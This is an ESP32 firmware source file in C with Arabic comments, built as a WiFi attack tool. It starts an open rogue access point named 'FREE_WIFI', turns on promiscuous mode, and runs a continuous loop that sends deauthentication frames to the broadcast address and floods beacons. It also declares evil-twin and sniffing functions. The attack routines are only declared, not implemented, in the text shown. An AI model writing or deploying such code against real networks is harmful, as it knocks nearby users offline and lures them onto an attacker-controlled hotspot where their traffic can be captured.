#include <stdio.h>
#include <string.h>
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "esp_wifi.h"
#include "esp_event.h"
#include "nvs_flash.h"
#include "esp_netif.h"

// تعريف الدوال المساعدة
void deauth_attack(uint8_t *bssid);
void beacon_flood(char *ssid);
void start_sniffing(void);
void evil_twin_start(char *target_ssid);
void rickroll_start(void);

// دالة الهجمات التي تعمل في الخلفية
void attack_loop(void *pv) {
    while(1) {
        // هجوم قطع الاتصال (Deauth) على الشبكات المجاورة
        uint8_t bssid[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
        deauth_attack(bssid);
        
        // إغراق المنطقة بإطارات Beacon لشبكة FREE_WIFI
        beacon_flood("FREE_WIFI");
        
        vTaskDelay(100 / portTICK_PERIOD_MS);
    }
}

// دالة تشغيل نقطة الوصول (AP) الخاصة بنا
void start_ap(void) {
    wifi_config_t ap_config = {
        .ap = {
            .ssid = "FREE_WIFI",        // اسم الشبكة التي ستظهر
            .ssid_len = 9,
            .password = "",             // شبكة مفتوحة بدون كلمة مرور
            .channel = 6,               // القناة 6
            .authmode = WIFI_AUTH_OPEN, // وضع المصادقة مفتوح
            .max_connection = 4,
        },
    };

    // تغيير وضع الـ WiFi إلى AP (نقطة وصول)
    esp_wifi_set_mode(WIFI_MODE_AP);
    // تطبيق الإعدادات على واجهة AP
    esp_wifi_set_config(WIFI_IF_AP, &ap_config);
    // تشغيل الـ WiFi
    esp_wifi_start();
}

void app_main(void) {
    // تهيئة الذاكرة والشبكة
    nvs_flash_init();
    esp_netif_init();
    esp_event_loop_create_default();

    // تهيئة الـ WiFi بالإعدادات الافتراضية
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    esp_wifi_init(&cfg);
    
    // --- الخطوة الأهم: تشغيل نقطة الوصول (AP) ---
    start_ap(); // سيؤدي هذا إلى ظهور شبكة FREE_WIFI

    // تأخير بسيط للتأكد من استقرار الشبكة قبل تفعيل وضع التنصت
    vTaskDelay(1000 / portTICK_PERIOD_MS);

    // تفعيل وضع التنصت (Promiscuous) للسماح بإرسال حزم مخصصة
    esp_wifi_set_promiscuous(true);
    // ضبط القناة التي سيعمل عليها الجهاز
    esp_wifi_set_channel(6, WIFI_SECOND_CHAN_NONE);

    // إنشاء المهمة الرئيسية التي ستقوم بتشغيل الهجمات في الخلفية
    xTaskCreate(attack_loop, "attack_loop", 4096, NULL, 5, NULL);
}
